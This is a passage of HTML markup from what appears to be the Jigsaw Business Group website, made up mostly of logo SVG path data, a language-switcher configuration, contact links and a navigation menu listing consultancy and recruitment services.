24.098 107.793 24.4009 107.152 24.5852C106.443 24.786 105.709 24.883 104.972 24.8733Z" fill="#00476D"/>
            <path d="M119.637 24.9022C118.905 24.9027 118.178 24.8047 117.473 24.6109C116.793 24.4304 116.152 24.1277 115.581 23.7178C115.039 23.3242 114.588 22.8201 114.256 22.2389C113.91 21.6126 113.736 20.9056 113.753 20.1902V20.1326C113.737 19.3866 113.904 18.6479 114.24 17.9815C114.569 17.3626 115.046 16.8348 115.629 16.445C116.281 16.0109 117.003 15.6935 117.764 15.5071C118.656 15.2849 119.572 15.1773 120.491 15.187C121.374 15.1779 122.255 15.2357 123.129 15.3599C123.864 15.4766 124.591 15.6337 125.309 15.8304V15.3631C125.309 14.0251 124.902 13.0125 124.089 12.3253C123.276 11.6382 122.128 11.2935 120.645 11.2914C119.782 11.2813 118.922 11.3803 118.084 11.5859C117.315 11.7832 116.566 12.0478 115.843 12.3765L115.142 10.5199C115.999 10.1286 116.887 9.80747 117.796 9.55962C118.803 9.30922 119.838 9.1898 120.875 9.2043C123.11 9.2043 124.807 9.76022 125.968 10.872C127.063 11.9391 127.611 13.4222 127.614 15.3215V24.5724H125.299V22.3317C124.685 23.0686 123.934 23.6795 123.087 24.1307C122.022 24.679 120.834 24.9447 119.637 24.9022ZM120.11 23.0584C120.801 23.0645 121.488 22.9663 122.149 22.7671C122.745 22.5895 123.305 22.3089 123.804 21.938C124.266 21.5961 124.649 21.1596 124.928 20.6576C125.205 20.1528 125.348 19.585 125.341 19.0091V17.6102C124.752 17.4566 124.083 17.3114 123.334 17.1749C122.48 17.0308 121.616 16.9622 120.751 16.97C119.291 16.97 118.161 17.2474 117.361 17.8023C116.989 18.0353 116.683 18.3599 116.473 18.745C116.263 19.1301 116.155 19.5627 116.16 20.0014V20.059C116.153 20.5064 116.264 20.9479 116.48 21.3394C116.692 21.7217 116.989 22.0503 117.348 22.2997C117.734 22.5602 118.16 22.7569 118.609 22.8823C119.099 23.01 119.604 23.0692 120.11 23.0584Z" fill="#00476D"/>
            <path d="M131.253 9.44775H133.753L137.915 21.5957L142.153 9.39014H144.102L148.347 21.5957L152.508 9.44775H154.947L149.4 24.6975H147.354L143.116 12.7576L138.846 24.6975H136.772L131.253 9.44775Z" fill="#00476D"/>
            <path d="M44.8318 34.0403H48.545C48.9958 34.0318 49.4448 34.0989 49.8734 34.2387C50.229 34.3488 50.5566 34.5344 50.8337 34.7829C51.0136 34.9558 51.1561 35.1637 51.2525 35.3938C51.3488 35.624 51.397 35.8715 51.3939 36.1209V36.1465C51.3987 36.3929 51.3585 36.638 51.2755 36.87C51.2039 37.0718 51.0954 37.2585 50.9554 37.4205C50.8288 37.5733 50.6798 37.706 50.5136 37.8143C50.3542 37.9211 50.1848 38.0122 50.0079 38.0864C50.2601 38.1552 50.5046 38.2496 50.7377 38.368C50.9527 38.4753 51.1502 38.6145 51.3235 38.781C51.5028 38.9531 51.6443 39.1607 51.7391 39.3905C51.8339 39.6203 51.8798 39.8673 51.8741 40.1158V40.1382C51.8808 40.4705 51.8047 40.7993 51.6527 41.0949C51.5007 41.3905 51.2776 41.6437 51.0034 41.8316C50.6976 42.0394 50.3572 42.1912 49.9982 42.2797C49.5801 42.3875 49.1496 42.4402 48.7178 42.4366H44.8318V34.0403ZM48.3977 37.7695C48.9081 37.7929 49.4137 37.6612 49.8478 37.3917C50.0287 37.27 50.1749 37.1033 50.272 36.908C50.3691 36.7127 50.4138 36.4955 50.4016 36.2778V36.2522C50.4064 36.0585 50.3633 35.8665 50.2762 35.6934C50.1891 35.5204 50.0606 35.3714 49.9022 35.2599C49.4769 34.9873 48.9754 34.8583 48.4714 34.8917H45.8177V37.7727L48.3977 37.7695ZM48.7627 41.5819C49.3137 41.6125 49.861 41.474 50.3312 41.185C50.5137 41.0666 50.6625 40.903 50.7629 40.71C50.8633 40.517 50.912 40.3012 50.9041 40.0838V40.0582C50.9102 39.8453 50.859 39.6348 50.7559 39.4484C50.6529 39.2621 50.5018 39.1068 50.3184 38.9987C49.7825 38.7126 49.1763 38.5849 48.5706 38.6305H45.8177V41.5915L48.7627 41.5819Z" fill="#00ADE4"/>
            <path d="M57.8474 42.5644C57.3437 42.5711 56.8425 42.492 56.3653 42.3307C55.9367 42.1846 55.5447 41.9477 55.2161 41.6361C54.8865 41.314 54.6328 40.9225 54.4735 40.4901C54.2875 39.9873 54.1963 39.4544 54.2046 38.9184V34.04H55.1969V38.8608C55.1464 39.6257 55.4007 40.3795 55.9044 40.9575C56.1631 41.2095 56.4714 41.4048 56.8098 41.5311C57.1482 41.6573 57.5092 41.7116 57.8698 41.6905C58.2203 41.7083 58.5708 41.6558 58.9007 41.5359C59.2306 41.4161 59.5331 41.2313 59.7904 40.9927C60.2684 40.5317 60.5064 39.8403 60.5042 38.9184V34.04H61.4902V38.8416C61.5014 39.3929 61.4124 39.9417 61.2277 40.4613C61.0748 40.8953 60.8249 41.2886 60.4971 41.6115C60.1693 41.9343 59.7721 42.1781 59.3359 42.3243C58.8568 42.4878 58.3535 42.569 57.8474 42.5644Z" fill="#00ADE4"/>
            <path d="M67.3287 42.5515C66.6743 42.5632 66.0233 42.4547 65.4081 42.2314C64.8007 41.9953 64.2403 41.6527 63.7532 41.2198L64.3646 40.5252C64.7759 40.895 65.2439 41.1965 65.7506 41.4183C66.2598 41.6198 66.8037 41.7187 67.3511 41.7096C67.855 41.7359 68.3534 41.5953 68.7692 41.3095C68.9338 41.1945 69.068 41.0411 69.16 40.8627C69.252 40.6842 69.2992 40.486 69.2974 40.2851V40.2595C69.3004 40.0807 69.2666 39.9031 69.1981 39.7378C69.1197 39.5686 68.9997 39.4221 68.8492 39.312C68.6366 39.1622 68.4023 39.0456 68.1546 38.9663C67.7838 38.8416 67.4053 38.741 67.0214 38.6654C66.5824 38.5781 66.1502 38.4594 65.7282 38.3101C65.3971 38.1947 65.0861 38.0284 64.8063 37.8171C64.5768 37.6384 64.3926 37.4081 64.2685 37.1449C64.1464 36.8611 64.0864 36.5544 64.0925 36.2454V36.223C64.0909 35.9063 64.1644 35.5936 64.307 35.3107C64.45 35.0279 64.6545 34.7807 64.9055 34.5873C65.1791 34.3749 65.4879 34.2124 65.8178 34.1072C66.189 33.9874 66.577 33.928 66.967 33.9311C67.5379 33.9201 68.1065 34.0078 68.6475 34.1904C69.1487 34.3756 69.6184 34.6368 70.04 34.965L69.4638 35.6949C69.0955 35.3967 68.6801 35.162 68.2346 35.0002C67.823 34.8564 67.3902 34.7829 66.9542 34.7826C66.4697 34.7563 65.9905 34.8939 65.5938 35.1731C65.4402 35.282 65.3148 35.4259 65.228 35.5929C65.1411 35.7599 65.0953 35.9452 65.0944 36.1334V36.1558C65.0905 36.3389 65.1243 36.5209 65.1936 36.6904C65.2735 36.8641 65.3984 37.0133 65.5554 37.1225C65.7776 37.2769 66.0214 37.3977 66.2788 37.481C66.6668 37.6149 67.0636 37.7219 67.4664 37.8011C68.2395 37.9244 68.9755 38.2186 69.6207 38.6622C69.8479 38.841 70.0293 39.0712 70.1501 39.3339C70.2709 39.5966 70.3275 39.8842 70.3153 40.1731V40.1987C70.3206 40.5375 70.2437 40.8725 70.0912 41.175C69.9438 41.4659 69.7353 41.7214 69.4798 41.9241C69.2005 42.1422 68.8822 42.3052 68.5419 42.4042C68.1471 42.5135 67.7382 42.5632 67.3287 42.5515Z" fill="#00ADE4"/>
            <path d="M72.8953 34.04H73.8844V42.4331H72.8953V34.04Z" fill="#00ADE4"/>
            <path d="M76.9316 34.04H77.8535L83.3625 40.7622V34.04H84.3228V42.4331H83.5386L77.8919 35.5509V42.4331H76.9316V34.04Z" fill="#00ADE4"/>
            <path d="M87.2964 34.04H93.6184V34.8915H88.2823V37.7724H93.055V38.6303H88.2823V41.5785H93.6792V42.4299H87.2964V34.04Z" fill="#00ADE4"/>
            <path d="M99.1756 42.5522C98.5212 42.5643 97.8702 42.4558 97.255 42.2321C96.6476 41.996 96.0872 41.6535 95.6001 41.2206L96.2115 40.526C96.6229 40.8958 97.0908 41.1973 97.5975 41.4191C98.1067 41.6205 98.6506 41.7195 99.1981 41.7104C99.7019 41.7367 100.2 41.5961 100.616 41.3102C100.781 41.1953 100.915 41.0419 101.007 40.8634C101.099 40.6849 101.146 40.4867 101.144 40.2859V40.2603C101.147 40.0814 101.114 39.9038 101.045 39.7385C100.967 39.5694 100.847 39.4229 100.696 39.3128C100.483 39.1629 100.249 39.0464 100.002 38.9671C99.6307 38.8423 99.2522 38.7418 98.8683 38.6662C98.4238 38.5786 97.9863 38.4588 97.5591 38.3077C97.2281 38.1923 96.917 38.026 96.6372 37.8147C96.4077 37.636 96.2235 37.4057 96.0995 37.1425C95.9773 36.8587 95.9173 36.552 95.9234 36.243V36.2206C95.9203 35.9037 95.9939 35.5907 96.1379 35.3083C96.2809 35.0255 96.4854 34.7783 96.7365 34.5849C97.01 34.3725 97.3188 34.2099 97.6488 34.1047C98.0199 33.985 98.4079 33.9256 98.7979 33.9287C99.3689 33.9176 99.9374 34.0053 100.478 34.1879C100.98 34.3731 101.449 34.6344 101.871 34.9626L101.295 35.6924C100.926 35.3943 100.511 35.1595 100.066 34.9978C99.6539 34.854 99.2211 34.7804 98.7851 34.7801C98.3007 34.7539 97.8215 34.8914 97.4247 35.1707C97.2711 35.2795 97.1457 35.4234 97.0589 35.5904C96.972 35.7574 96.9263 35.9427 96.9253 36.131V36.1534C96.9215 36.3365 96.9552 36.5184 97.0246 36.6879C97.1044 36.8617 97.2293 37.0109 97.3863 37.1201C97.6085 37.2744 97.8523 37.3952 98.1097 37.4786C98.4977 37.6125 98.8945 37.7194 99.2973 37.7987C100.07 37.922 100.806 38.2162 101.452 38.6598C101.678 38.8391 101.859 39.0694 101.98 39.332C102.101 39.5945 102.158 39.8819 102.146 40.1707V40.1963C102.15 40.5349 102.073 40.8695 101.922 41.1726C101.775 41.4635 101.566 41.719 101.311 41.9216C101.031 42.1398 100.713 42.3027 100.373 42.4018C99.9833 42.5106 99.5799 42.5613 99.1756 42.5522Z" fill="#00ADE4"/>
            <path d="M107.661 42.5515C107.007 42.5632 106.356 42.4547 105.741 42.2314C105.133 41.9953 104.573 41.6527 104.086 41.2198L104.697 40.5252C105.11 40.8951 105.579 41.1966 106.087 41.4183C106.595 41.6206 107.14 41.7196 107.687 41.7096C108.191 41.7364 108.69 41.5957 109.105 41.3095C109.27 41.1947 109.405 41.0414 109.497 40.863C109.59 40.6845 109.638 40.4862 109.637 40.2851V40.2595C109.638 40.0804 109.604 39.9028 109.534 39.7378C109.457 39.5679 109.337 39.4212 109.185 39.312C108.973 39.1613 108.739 39.0447 108.491 38.9663C108.12 38.8416 107.741 38.741 107.357 38.6654C106.917 38.5783 106.484 38.4595 106.061 38.3101C105.731 38.1955 105.42 38.0291 105.142 37.8171C104.911 37.6394 104.726 37.4089 104.601 37.1449C104.48 36.8608 104.421 36.5542 104.428 36.2454V36.223C104.426 35.9065 104.498 35.5938 104.64 35.3107C104.784 35.0286 104.988 34.7816 105.238 34.5873C105.512 34.3749 105.821 34.2124 106.151 34.1072C106.522 33.9874 106.91 33.928 107.3 33.9311C107.871 33.9201 108.439 34.0078 108.98 34.1904C109.481 34.3756 109.951 34.6368 110.373 34.965L109.797 35.6949C109.428 35.3967 109.013 35.162 108.567 35.0002C108.156 34.8564 107.723 34.7829 107.287 34.7826C106.803 34.7563 106.323 34.8939 105.927 35.1731C105.773 35.282 105.648 35.4259 105.561 35.5929C105.474 35.7599 105.428 35.9452 105.427 36.1334V36.1558C105.423 36.3389 105.457 36.5209 105.526 36.6904C105.607 36.8634 105.732 37.0123 105.888 37.1225C106.111 37.2774 106.356 37.3983 106.615 37.481C107.002 37.6154 107.397 37.7223 107.799 37.8011C108.572 37.9238 109.309 38.218 109.953 38.6622C110.181 38.841 110.362 39.0712 110.483 39.3339C110.604 39.5966 110.66 39.8842 110.648 40.1731V40.1987C110.653 40.5371 110.577 40.8717 110.427 41.175C110.279 41.466 110.069 41.7215 109.813 41.9241C109.533 42.1422 109.215 42.3052 108.875 42.4042C108.48 42.5138 108.071 42.5634 107.661 42.5515Z" fill="#00ADE4"/>
            <path d="M123.61 42.4346C122.976 42.4452 122.346 42.331 121.756 42.0984C121.232 41.8892 120.756 41.5755 120.357 41.1766C119.97 40.7849 119.668 40.3173 119.471 39.8033C119.259 39.2672 119.151 38.6959 119.151 38.1196V38.094C119.147 36.9642 119.581 35.8768 120.361 35.0594C120.754 34.651 121.224 34.3246 121.743 34.0991C122.309 33.8589 122.918 33.739 123.533 33.747C123.87 33.7436 124.208 33.7682 124.541 33.8206C124.831 33.8629 125.115 33.9347 125.389 34.0351C125.646 34.1284 125.892 34.2463 126.126 34.3872C126.358 34.5312 126.582 34.6895 126.795 34.8609L126.155 35.5812C125.989 35.4391 125.813 35.3086 125.63 35.1906C125.442 35.073 125.244 34.9733 125.037 34.8929C124.811 34.8041 124.576 34.7376 124.336 34.6945C124.059 34.6437 123.777 34.6191 123.494 34.6208C123.048 34.6175 122.606 34.7065 122.195 34.8823C121.785 35.058 121.415 35.3166 121.11 35.642C120.811 35.9598 120.577 36.3328 120.421 36.7399C120.255 37.1607 120.17 37.6094 120.172 38.0619V38.0876C120.166 38.5617 120.249 39.0327 120.415 39.4768C120.569 39.8884 120.805 40.2642 121.11 40.5812C121.415 40.8997 121.785 41.1496 122.195 41.3142C122.652 41.4958 123.14 41.585 123.632 41.5767C124.114 41.5793 124.592 41.4958 125.044 41.3302C125.441 41.1888 125.816 40.9892 126.155 40.738V38.6509H123.51V37.7995H127.118V41.1445C126.667 41.523 126.159 41.8286 125.614 42.0504C124.978 42.3126 124.297 42.4433 123.61 42.4346Z" fill="#00ADE4"/>
            <path d="M129.829 33.9098H133.59C134.079 33.9016 134.567 33.9763 135.031 34.1307C135.419 34.2591 135.775 34.4698 136.074 34.7484C136.291 34.9545 136.461 35.2044 136.574 35.4815C136.694 35.7737 136.754 36.0873 136.75 36.4034V36.429C136.756 36.7514 136.696 37.0716 136.574 37.3701C136.461 37.6407 136.293 37.8849 136.081 38.0871C135.859 38.2973 135.604 38.4683 135.325 38.5929C135.019 38.728 134.696 38.8227 134.365 38.8746L137.051 42.3029H135.841L133.315 39.0314H130.815V42.2933H129.829V33.9098ZM133.507 38.1896C133.812 38.193 134.116 38.1531 134.41 38.0711C134.666 37.9995 134.907 37.8836 135.124 37.7286C135.32 37.5874 135.482 37.4021 135.594 37.1876C135.71 36.9643 135.768 36.7157 135.764 36.4642V36.4386C135.773 36.203 135.724 35.9688 135.622 35.7567C135.519 35.5445 135.365 35.3609 135.175 35.2222C134.684 34.9026 134.104 34.7489 133.52 34.7837H130.815V38.1896H133.507Z" fill="#00ADE4"/>
            <path d="M143.418 42.4345C142.795 42.4434 142.177 42.3247 141.603 42.0855C141.076 41.8688 140.598 41.5488 140.197 41.1444C139.805 40.7516 139.497 40.2833 139.291 39.768C139.078 39.2447 138.969 38.6846 138.971 38.1195V38.0939C138.968 37.5265 139.077 36.964 139.291 36.4389C139.5 35.9206 139.81 35.4493 140.204 35.0529C140.608 34.6443 141.087 34.3181 141.615 34.0926C142.784 33.6254 144.087 33.6254 145.255 34.0926C145.781 34.3102 146.259 34.6301 146.66 35.0337C147.051 35.4275 147.359 35.8955 147.566 36.4101C147.778 36.9338 147.887 37.4936 147.886 38.0586C147.886 38.0586 147.886 38.0779 147.886 38.0843C147.89 39.2209 147.446 40.3134 146.651 41.1252C146.247 41.5338 145.767 41.86 145.239 42.0855C144.662 42.3236 144.042 42.4423 143.418 42.4345ZM143.443 41.5606C143.917 41.5647 144.386 41.4721 144.823 41.2885C145.229 41.1188 145.598 40.8683 145.905 40.5523C146.208 40.2373 146.447 39.8666 146.609 39.4607C146.782 39.035 146.87 38.5791 146.865 38.1195V38.0939C146.869 37.6322 146.782 37.1741 146.609 36.7462C146.446 36.3357 146.202 35.9623 145.892 35.6483C145.568 35.3217 145.183 35.0631 144.758 34.8878C144.333 34.7124 143.877 34.6238 143.418 34.6271C142.944 34.6233 142.475 34.7158 142.038 34.8992C141.632 35.069 141.265 35.3195 140.959 35.6355C140.656 35.9512 140.416 36.3216 140.252 36.727C140.08 37.1531 139.993 37.6087 139.996 38.0683V38.0939C139.993 38.5554 140.08 39.0132 140.252 39.4415C140.415 39.8522 140.66 40.2256 140.972 40.5394C141.284 40.8556 141.655 41.1078 142.063 41.2821C142.499 41.4709 142.969 41.5658 143.443 41.5606Z" fill="#00ADE4"/>
            <path d="M153.974 42.4222C153.471 42.4291 152.969 42.3501 152.492 42.1885C152.064 42.0424 151.672 41.8055 151.343 41.4939C151.013 41.1718 150.76 40.7803 150.6 40.3479C150.417 39.8447 150.328 39.3118 150.338 38.7762V33.9106H151.321V38.7122C151.27 39.4771 151.524 40.2309 152.028 40.8089C152.287 41.0609 152.595 41.2562 152.934 41.3825C153.272 41.5087 153.633 41.563 153.994 41.5419C154.344 41.5594 154.694 41.507 155.024 41.3878C155.353 41.2685 155.656 41.0848 155.914 40.8473C156.392 40.3821 156.63 39.6896 156.628 38.7698V33.9106H157.614V38.7122C157.625 39.2635 157.536 39.8123 157.351 40.3319C157.199 40.7659 156.949 41.1592 156.621 41.4821C156.293 41.8049 155.896 42.0487 155.46 42.1949C154.981 42.3537 154.479 42.4306 153.974 42.4222Z" fill="#00ADE4"/>
            <path d="M160.457 33.91H163.728C164.182 33.9044 164.634 33.9669 165.069 34.0957C165.445 34.2062 165.796 34.3853 166.106 34.6239C166.389 34.8455 166.616 35.1306 166.769 35.4561C166.927 35.807 167.006 36.1885 166.999 36.5733V36.5957C167.01 37.0106 166.915 37.4213 166.724 37.7897C166.543 38.1272 166.29 38.4202 165.982 38.6475C165.652 38.8862 165.282 39.063 164.89 39.1693C164.458 39.2866 164.012 39.3448 163.565 39.3422H161.442V42.3031H160.457V33.91ZM163.61 38.4907C163.942 38.4935 164.273 38.4493 164.592 38.3594C164.868 38.281 165.126 38.1518 165.354 37.9785C165.564 37.8244 165.733 37.622 165.848 37.3885C165.963 37.1551 166.019 36.8974 166.014 36.6373V36.6149C166.03 36.3517 165.98 36.0886 165.868 35.8498C165.756 35.611 165.586 35.4041 165.373 35.248C164.866 34.9177 164.268 34.7553 163.664 34.7839H161.449V38.4907H163.61Z" fill="#00ADE4"/>
            <path d="M20.7747 18.9201H27.1767C27.3586 18.9179 27.5378 18.9642 27.6959 19.0542C27.854 19.1442 27.9853 19.2747 28.0762 19.4322C28.1634 19.5869 28.2059 19.7628 28.1991 19.9402C28.1923 20.1177 28.1365 20.2897 28.0378 20.4374C27.8372 20.7347 27.7261 21.0833 27.7176 21.4419C27.7091 21.8004 27.8035 22.1539 27.9898 22.4604C28.1856 22.7729 28.4619 23.027 28.7897 23.1959C29.1174 23.3649 29.4847 23.4425 29.8528 23.4207H29.9456C30.3115 23.4392 30.6757 23.36 31.0008 23.1912C31.3259 23.0224 31.6003 22.7702 31.7958 22.4604C31.9817 22.1525 32.0757 21.7978 32.0667 21.4382C32.0576 21.0786 31.9458 20.7291 31.7446 20.431C31.6447 20.2836 31.5887 20.1109 31.5831 19.933C31.5774 19.7551 31.6223 19.5792 31.7126 19.4258C31.8017 19.2646 31.9332 19.1308 32.0929 19.0388C32.2525 18.9469 32.4343 18.9003 32.6185 18.9041H39.5007C38.9757 9.19854 30.8739 1.42964 20.7747 0.946289V6.16397C21.6918 6.02433 22.6293 6.19202 23.4411 6.64092C24.0725 6.98291 24.5971 7.49274 24.9569 8.11412C25.3167 8.73549 25.4978 9.44423 25.4802 10.1621C25.4977 10.8787 25.3175 11.5863 24.9596 12.2074C24.6016 12.8285 24.0796 13.3391 23.4507 13.6832C22.6384 14.1408 21.697 14.3153 20.7747 14.1793V18.9201Z" fill="#00476D"/>
            <path d="M34.0749 20.876C34.2155 21.7614 34.0399 22.668 33.5788 23.4368C33.1728 24.0402 32.6248 24.5346 31.9829 24.8764C31.341 25.2183 30.6248 25.397 29.8976 25.397C29.1703 25.397 28.4542 25.2183 27.8123 24.8764C27.1704 24.5346 26.6223 24.0402 26.2164 23.4368C25.7535 22.6687 25.5777 21.7614 25.7202 20.876H20.7747C20.7747 20.876 20.7747 23.3504 20.7747 26.6378C20.9947 26.6008 21.2173 26.5815 21.4405 26.5802C22.005 26.5771 22.564 26.6913 23.082 26.9157C23.6 27.1402 24.0656 27.4698 24.4494 27.8839C24.8331 28.2979 25.1266 28.7871 25.3112 29.3206C25.4958 29.8541 25.5674 30.4202 25.5215 30.9828C25.4756 31.5455 25.3132 32.0924 25.0447 32.589C24.7761 33.0855 24.4072 33.5208 23.9614 33.8671C23.5157 34.2135 23.0027 34.4634 22.4552 34.6009C21.9077 34.7384 21.3376 34.7606 20.7811 34.666C20.7811 38.44 20.7811 41.7851 20.7811 42.8254C31.2772 38.5905 39.0269 30.9016 39.4879 20.8472L34.0749 20.876Z" fill="#00ADE4"/>
            <path d="M9.57108 16.6315C10.1362 16.6307 10.6951 16.7507 11.21 16.9836C11.0052 16.7834 10.7614 16.6276 10.4937 16.5257C10.2261 16.4238 9.94037 16.3781 9.6543 16.3914H9.57108C9.29356 16.3786 9.0163 16.4216 8.75568 16.5178C8.49507 16.614 8.2564 16.7615 8.05379 16.9516C8.5318 16.7406 9.04856 16.6315 9.57108 16.6315ZM23.4315 30.556V30.4663C23.4436 30.1053 23.3551 29.7479 23.176 29.4342C22.9968 29.1205 22.734 28.8628 22.4168 28.6898C22.0903 28.5112 21.7224 28.4219 21.3504 28.4309C20.9783 28.4399 20.6152 28.5468 20.2977 28.741C20.1409 28.8367 19.9618 28.8896 19.7782 28.8947C19.5946 28.8998 19.4128 28.8567 19.251 28.7698C19.0905 28.6904 18.9553 28.5677 18.8609 28.4155C18.7664 28.2634 18.7164 28.0878 18.7164 27.9087L18.7324 20.8921H13.7516C13.7516 20.9273 13.7516 20.9625 13.7516 21.0009C13.7516 22.0156 13.5211 23.0976 12.9706 23.8402C12.5639 24.3455 12.0447 24.7488 11.4545 25.0178C10.8642 25.2868 10.2193 25.4141 9.57108 25.3895C8.88955 25.4071 8.21381 25.2603 7.60095 24.9617C6.98808 24.6631 6.4561 24.2213 6.04995 23.6738C5.54326 22.8796 5.31782 21.9384 5.40974 21.0009C5.40974 20.9657 5.40974 20.9305 5.40974 20.8953H0C0.441742 28.9394 6.08196 35.6616 13.7644 37.9888V45.0534C15.4449 44.657 17.1032 44.1719 18.7324 43.6002C18.7324 41.4203 18.7324 36.5995 18.7324 34.7301H18.7132V33.1296C18.7126 32.95 18.7623 32.7737 18.8568 32.6209C18.9513 32.4682 19.0868 32.345 19.2478 32.2653C19.4102 32.1794 19.5922 32.1374 19.7758 32.1436C19.9595 32.1498 20.1383 32.2039 20.2945 32.3005C20.6106 32.4944 20.9725 32.6008 21.3432 32.6086C21.7139 32.6165 22.08 32.5256 22.404 32.3453C22.7234 32.1725 22.9878 31.9134 23.1672 31.5976C23.3466 31.2818 23.4338 30.922 23.4187 30.5592" fill="#00476D"/>
            <path d="M23.4315 10.2294V10.1398C23.4434 9.77828 23.3549 9.42057 23.1758 9.10637C22.9966 8.79218 22.7339 8.53381 22.4167 8.35998C22.0908 8.18044 21.7232 8.09005 21.3512 8.09792C20.9791 8.10578 20.6157 8.21164 20.2976 8.4048C20.1423 8.50351 19.9634 8.5591 19.7795 8.56585C19.5955 8.5726 19.4131 8.53027 19.2509 8.44321C19.0899 8.36357 18.9544 8.24036 18.8599 8.08758C18.7654 7.9348 18.7157 7.75857 18.7163 7.57893V0.962402C14.7918 1.15518 11.009 2.49028 7.83284 4.80364C6.55243 5.56228 5.03834 7.23322 4.45575 7.93424C1.80299 11.0146 0.240199 14.8839 0.00952148 18.9426H5.45127H6.82771C7.00987 18.939 7.18961 18.9847 7.34793 19.0749C7.50626 19.165 7.6373 19.2963 7.7272 19.4547C7.81767 19.6084 7.86214 19.7848 7.85533 19.9629C7.84852 20.1411 7.79072 20.3136 7.68879 20.4599C7.49043 20.7581 7.38064 21.1064 7.37214 21.4645C7.36364 21.8225 7.45678 22.1756 7.64078 22.4829C7.83533 22.7977 8.11089 23.0543 8.43863 23.2261C8.76637 23.3979 9.13425 23.4784 9.50378 23.4592H9.59661C9.96401 23.476 10.3292 23.3944 10.6545 23.2228C10.9798 23.0511 11.2533 22.7957 11.4468 22.4829C11.6337 22.1756 11.7288 21.8212 11.7208 21.4617C11.7129 21.1021 11.6023 20.7522 11.402 20.4535C11.2997 20.3073 11.2417 20.1348 11.2348 19.9566C11.228 19.7783 11.2727 19.6019 11.3636 19.4483C11.4536 19.2897 11.5846 19.1582 11.7428 19.0676C11.901 18.9769 12.0807 18.9304 12.2631 18.933H13.8028H18.7419V12.7934C18.7413 12.6138 18.791 12.4375 18.8855 12.2848C18.98 12.132 19.1155 12.0088 19.2765 11.9291C19.4385 11.8414 19.621 11.7987 19.8051 11.8055C19.9892 11.8122 20.1681 11.8682 20.3233 11.9675C20.6401 12.1592 21.0018 12.2643 21.372 12.2721C21.7422 12.28 22.108 12.1904 22.4327 12.0124C22.7479 11.8367 23.0081 11.577 23.1845 11.2622C23.3608 10.9474 23.4463 10.5899 23.4315 10.2294Z" fill="#00ADE4"/>
        </svg>
        </a>
		</div><!-- .site-branding -->

		<nav id="site-navigation" class="main-navigation">
            <div class="mob-menu">
                <div class="language">
                    <div class="gtranslate_wrapper">
                    <a href="#" class="gt_switcher-popup glink nturl notranslate svg-link">
                    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 22 22" fill="none">
                            <path d="M20 3H10L9 0H2C0.9 0 0 0.9 0 2V17C0 18.1 0.9 19 2 19H10L11 22H20C21.1 22 22 21.1 22 20V5C22 3.9 21.1 3 20 3ZM6 15C3.24 15 1 12.76 1 10C1 7.24 3.24 5 6 5C7.35 5 8.48 5.5 9.35 6.3L8.03 7.57C7.65 7.21 6.99 6.79 6 6.79C4.26 6.79 2.85 8.23 2.85 10C2.85 11.77 4.26 13.21 6 13.21C8.01 13.21 8.84 11.77 8.92 10.8H6V9.09H10.68C10.75 9.4 10.8 9.7 10.8 10.11C10.8 12.97 8.89 15 6 15ZM12.17 9.58H15.87C15.44 10.83 14.76 12.01 13.82 13.05C13.51 12.7 13.22 12.33 12.96 11.95L12.17 9.58ZM20.5 19.5C20.5 20.05 20.05 20.5 19.5 20.5H13L15 18L13.96 14.9L17.06 18L17.98 17.08L14.68 13.83L14.7 13.81C15.83 12.56 16.63 11.12 17.1 9.59H19V8.29H14.47V7H13.18V8.29H11.74L10.46 4.5H19.5C20.05 4.5 20.5 4.95 20.5 5.5V19.5Z" fill="#00ADE4"/>
                    </svg>
                    </a>
                    </div>
                    <script>window.gtranslateSettings = {"default_language":"en","native_language_names":true,"languages":["en","fr","de","it","es","nl","ja"],"wrapper_selector":".gtranslate_wrapper"}</script>
                    
                            
                    </div>
                    <a href="tel:01912286596">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
                            <path d="M6.62 10.79C8.06 13.62 10.38 15.93 13.21 17.38L15.41 15.18C15.68 14.91 16.08 14.82 16.43 14.94C17.55 15.31 18.76 15.51 20 15.51C20.55 15.51 21 15.96 21 16.51V20C21 20.55 20.55 21 20 21C10.61 21 3 13.39 3 4C3 3.45 3.45 3 4 3H7.5C8.05 3 8.5 3.45 8.5 4C8.5 5.25 8.7 6.45 9.07 7.57C9.18 7.92 9.1 8.31 8.82 8.59L6.62 10.79Z" fill="#00ADE4"/>
                        </svg>
                    </a>
                    <a href="mailto:info@jigsawbusinessgroup.com">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
                            <path d="M20 4H4C2.9 4 2.01 4.9 2.01 6L2 18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6C22 4.9 21.1 4 20 4ZM20 8L12 13L4 8V6L12 11L20 6V8Z" fill="#00ADE4"/>
                        </svg>
                    </a>
                    
            </div>
            <button class="menu-icon-toggle" aria-label="mobile-toggle"><span></span></button> 
			<div class="menu-menu-1-container"><ul id="primary-menu" class="menu"><li id="menu-item-350" class="expertise menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-350"><a>Expertise</a>
<ul class="sub-menu">
	<li id="menu-item-356" class="title col-2 menu-item menu-item-type-custom menu-item-object-custom menu-item-356"><a>Business Consultancy</a></li>
	<li id="menu-item-348" class="col-2 menu-item menu-item-type-post_type menu-item-object-page menu-item-348"><a href="https://jigsawbusinessgroup.com/supply-chain/">Supply Chain</a></li>
	<li id="menu-item-395" class="col-2 menu-item menu-item-type-post_type menu-item-object-page menu-item-395"><a href="https://jigsawbusinessgroup.com/business-improvement-support/">Business Improvement/Support</a></li>
	<li id="menu-item-399" class="col-2 menu-item menu-item-type-post_type menu-item-object-page menu-item-399"><a href="https://jigsawbusinessgroup.com/project-management/">Project Management</a></li>
	<li id="menu-item-404" class="col-2 menu-item menu-item-type-post_type menu-item-object-page menu-item-404"><a href="https://jigsawbusinessgroup.com/business-training-and-development/">Business Training and Development</a></li>
	<li id="menu-item-357" class="title col-2 menu-item menu-item-type-custom menu-item-object-custom menu-item-357"><a>Recruitment Specialist</a></li>
	<li id="menu-item-408" class="col-2 menu-item menu-item-type-post_type menu-item-object-page menu-item-408"><a href="https://jigsawbusinessgroup.com/client-recruitment/">Client Recruitment</a></li>
	<li id="menu-item-413" class="col-2 menu-item menu-item-type-post_type menu-item-object-page menu-item-413"><a href="https://jigsawbusinessgroup.com/vacancies/">Candidate &#8211; Vacancies</a></li>
